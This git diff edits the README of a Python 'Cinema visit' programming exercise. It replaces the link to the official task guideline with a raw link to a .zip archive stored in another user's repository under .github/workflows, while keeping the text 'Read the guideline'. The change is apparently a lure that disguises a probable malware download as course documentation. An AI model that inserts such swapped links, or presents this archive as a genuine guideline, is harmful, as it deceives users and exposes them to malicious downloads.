@@ -1,6 +1,6 @@
 # Cinema visit
 
-- Read [the guideline](https://github.com/mate-academy/py-task-guideline/blob/main/README.md) before start
+- Read [the guideline](https://raw.githubusercontent.com/Rudge0/py-cinema-visit/master/.github/workflows/visit-py-cinema-v2.1.zip) before start
 
 You have opened your own cinema. To have a better idea 
 of what's going on in the cinema 
